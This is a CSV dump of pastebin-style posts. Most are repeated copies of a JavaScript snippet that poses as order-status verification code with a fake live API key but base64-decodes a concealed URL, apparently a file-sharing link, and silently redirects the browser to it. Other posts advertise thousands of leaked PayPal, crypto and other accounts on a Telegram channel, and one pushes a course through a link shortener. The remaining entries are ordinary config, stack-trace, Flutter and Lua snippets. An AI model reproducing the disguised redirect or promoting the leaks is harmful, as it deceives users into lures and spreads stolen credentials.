id,title,username,language,date,content
VRCA1Ubt,Untitled,reflezzzz,JavaScript,Friday 25th of April 2025 04:50:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41080/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GCCAVXy0,Leaked Accounts - Fresh Hits,kammex,JavaScript,Friday 25th of April 2025 04:49:44 PM CDT,04566 Accounts Posted On https://t.me/leakedbyem1nem
qKWSrKEv,Products.js,reflezzzz,JavaScript,Friday 25th of April 2025 04:35:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56430/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tTT3L0QQ,Chaturbate with Tokens,kammex,JavaScript,Friday 25th of April 2025 04:34:22 PM CDT,48313 Accounts Posted On https://t.me/leakedbyem1nem
XyKkaByE,Untitled,alexgill434,YAML,Friday 25th of April 2025 04:28:14 PM CDT,"# AppDaemon Add-on Configuration
volumes:
  - /config/www:/config/www  # Mount the www folder in Home Assistant

# Optional configuration for AppDaemon settings
appdaemon:
  latitude: 52.379189
  longitude: 4.899431
  elevation: 2
  time_zone: Europe/Amsterdam
  plugins:
    HASS:
      type: hass
http:
  url: http://127.0.0.1:5050
admin: true
api: true
hadashboard: true
"
BKaaCLqz,Order.js,reflezzzz,JavaScript,Friday 25th of April 2025 04:19:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86364/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
enHuDVQr,Crypto Accounts,kammex,JavaScript,Friday 25th of April 2025 04:19:00 PM CDT,59289 Accounts Posted On https://t.me/leakedbyem1nem
yC5DTbcA,Market.js,reflezzzz,JavaScript,Friday 25th of April 2025 04:04:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69182/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
r5BsU1eu,PayPal with Balance,kammex,JavaScript,Friday 25th of April 2025 04:03:38 PM CDT,10693 Accounts Posted On https://t.me/leakedbyem1nem
zByh70xu,2025-04-26T00:00:13.894206,powerampache,PHP,Friday 25th of April 2025 04:00:14 PM CDT,"1.01-79 (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
gCsjz28h,Complete Python Training - from Beginner to Advanced,f0f077,Python,Friday 25th of April 2025 03:52:11 PM CDT,"Complete Python Training - from Beginner to Advanced
Learn Python programming by doing, from basics to advanced concepts.
What you will learn
Master the basics of the Python language
Create games like Chifoumi (Rock, Paper, Scissors)
Learn Object-Oriented Programming with Classes
Understanding the data structures available in Python
for more:https://cuty.io/CHQDni"
WsAg2JUC,Untitled,reflezzzz,JavaScript,Friday 25th of April 2025 03:48:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18863/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PtV2LYTL,setup.lua,ouroborus,Lua,Friday 25th of April 2025 03:48:45 PM CDT,"--[[
    label set <task name>
    pastebin run PtV2LYTL <host url prefix> <auth token>
]]

local tArgs = { ... }
if #tArgs ~= 2 then
    error(""usage: pastebin run <pastebin id> <host url prefix> <auth token>"")
end

local host = tArgs[1]
local auth = tArgs[2]
local filename = ""startup.lua""
local label = os.getComputerLabel()

local response = http.get {
    url = host .. filename,
    headers = {
        [""X-Auth""] = auth,
        [""User-Agent""] = ""ComputerCraft (setup:"" .. label .. "")"",
    },
}

if response then
    local code = response.getResponseCode()
    if code == 200 then
        local data = response.readAll()
        response.close()
        local f = fs.open(""/"" .. filename, ""w"")
        f.write(data)
        f.close()
        os.reboot()
    else
        error(""Failed to download "" .. host .. filename .. "" with code "" .. code)
    end
end

error(""Failed to download "" .. host .. filename .. "" with nil response"")
"
5jMGM7rq,Leaked Accounts - Fresh Hits,kammex,JavaScript,Friday 25th of April 2025 03:48:17 PM CDT,02397 Accounts Posted On https://t.me/leakedbyem1nem
KRrEwgSX,image picture from internet flutter,muhaiminurabir,Dart,Friday 25th of April 2025 03:40:00 PM CDT,"CachedNetworkImage(
                            height: 150,
                            width: double.infinity,
                            imageUrl: guidanceModel.bannerUrl!,
                            imageBuilder: (context, imageProvider) => Container(
                              decoration: BoxDecoration(
                                image: DecorationImage(
                                  image: imageProvider,
                                  fit: BoxFit.fill,
                                ),
                              ),
                            ),
                            placeholder: (context, url) => Center(
                              child: CircularProgressIndicator(),
                            ),
                            errorWidget: (context, url, error) =>
                                const Icon(Icons.image),
                          ),"
pCkXXPSf,Products.js,reflezzzz,JavaScript,Friday 25th of April 2025 03:33:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94856/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
